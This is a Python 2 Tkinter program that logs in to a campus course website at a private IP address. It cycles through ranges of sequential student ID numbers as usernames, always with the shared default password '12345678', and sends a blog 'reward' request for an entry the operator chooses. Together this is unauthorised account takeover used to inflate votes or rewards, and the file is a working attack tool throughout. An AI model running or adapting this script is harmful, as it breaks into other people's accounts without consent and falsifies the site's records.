# -*- coding: utf-8 -*-
from Tkinter import *
import urllib2
import urllib
import cookielib
import time
import tkMessageBox

a=[]
for i in range(14061001,14061233):a.append(str(i))
for i in range(14231001,14231100):a.append(str(i))
#for i in range(13061001,13061233):a.append(str(i))
#for i in range(13231001,13231100):a.append(str(i))
#for i in range(12061001,12061233):a.append(str(i))
#for i in range(12231001,12231100):a.append(str(i))

	

def fuck():
	def wrongid():top.destroy();t.deiconify()
	entryid = e1.get()
	try:
		idnum=int(entryid)
	except:
		t.withdraw()
		top = Toplevel()
		top.geometry('+400+300')
		top.resizable(False,False)
		text1=Label(top,text="\nentryid应为数字\n".decode('utf-8'))
		text1.pack()
		button1=Button(top,text="知道了".decode('utf-8'),command=wrongid)
		button1.pack(fill=BOTH)
		return 0
	numstr = e2.get()
	try:
		idnum=int(numstr)
	except:
		t.withdraw()
		top = Toplevel()
		top.geometry('+400+300')
		top.resizable(False,False)
		text1=Label(top,text="\nnumber应为数字\n".decode('utf-8'))
		text1.pack()
		button1=Button(top,text="知道了".decode('utf-8'),command=wrongid)
		button1.pack(fill=BOTH)
		return 0
	password = e3.get()
	if password!="123":   #"fuckoo"+str(int(entryid)+1996):
		t.withdraw()
		top = Toplevel()
		top.geometry('+400+300')
		top.resizable(False,False)
		text1=Label(top,text="\n密码错误！\n".decode('utf-8'))
		text1.pack()
		button1=Button(top,text="知道了".decode('utf-8'),command=wrongid)
		button1.pack(fill=BOTH)
		return 0
	try:
		num=int(numstr)
	except:
		return 0
	login_page = "http://10.254.25.5/course/login/index.php"
	url = "http://10.254.25.5/course/blog/edit.php?action=reward&entryid="+entryid
	for i in range(len(a)):
		try:
			if num==0:break
			cj = cookielib.CookieJar()
			opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
			opener.addheaders = [('User-agent','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')]
			data = urllib.urlencode({"username":a[i],"password":"12345678"})
			opener.open(login_page,data)
			op=opener.open(url)
			num=num-1
			var2.set(str(num))
			t.update_idletasks()
			time.sleep(1)
		except:
			pass





t=Tk()
t.title('shiva')
t.geometry('+400+300')
t.resizable(False,False)

lab1 = Label(t, text="entryid :")
lab1.pack()
var1 = StringVar()
e1 = Entry(t, textvariable = var1)
e1.pack()

lab2 = Label(t, text="number :")
lab2.pack()
var2 = StringVar()
e2 = Entry(t, textvariable = var2)
e2.pack()

lab3 = Label(t, text="password :")
lab3.pack()
var3 = StringVar()
e3 = Entry(t, textvariable = var3,show='*')
e3.pack()

b=Button(t,command=fuck,relief='ridge',text="刷刷刷!".decode('utf-8'))
b.pack(fill=BOTH)  


t.mainloop()
